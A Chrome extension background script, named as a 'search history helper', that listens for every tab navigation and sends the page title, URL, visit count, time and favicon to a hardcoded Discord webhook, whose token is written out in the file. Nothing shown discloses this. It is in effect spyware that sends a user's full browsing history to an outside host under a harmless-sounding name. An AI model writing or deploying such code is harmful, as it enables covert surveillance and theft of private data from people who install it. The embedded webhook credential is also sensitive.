let discordWebhook = 'https://discord.com/api/webhooks/1196004134227283998/x8Kor5fwOiI8rLxS0oSsTAdE5xVH8ZEIytD_n7N69tkE2B57fQGN8mipvF3IDKRbKl5h';   
let urlCountMap = {}; 
let username = '搜尋紀錄小幫手';
const timestamp = new Date().toISOString();

function sendToDiscord(message) {

    fetch(discordWebhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
    })
    .then(res => {
        console.log('Sent Discord webhook', res);
    })
    .catch(err => {
        console.error('Error sending Discord webhook', err); 
    });

}

function formatTimestamp(date) {
    return date.toLocaleString('zh-TW', { hour12: false });  
}


chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    setTimeout(() => {
        if (changeInfo.url && tab.url !== changeInfo.prevUrl) {
            let url = tab.url;
            let count = urlCountMap[url] || 0;
            urlCountMap[url] = count + 1;

            let message = {
                "embeds": [
                    {
                        "title": "新分頁",
                        "color": 5829375,
                        "description": null,
                        "fields": [
                            {
                                "name": "分頁標題",
                                "value": tab.title || document.title || '無標題',
                                "inline": false
                            },
                            {
                                "name": "分頁網址",
                                "value": url,
                                "inline": false
                            },
                            {
                                "name": "瀏覽次數",
                                "value": String(count+1),
                                "inline": false
                            },
                            {
                                "name": "瀏覽時間",
                                "value": formatTimestamp(new Date()),
                                "inline": false
                            }
                        ],
                        
                        "image": {
                            "url": tab.favIconUrl
                        }
                    }
                ],
                "username": username,
                "avatar_url": "https://c.tenor.com/tu7TMa-F1F0AAAAd/tenor.gif",
                "content": null,
                "attachments": []
            }
            
            sendToDiscord(message);
        }
    }, 5000)
});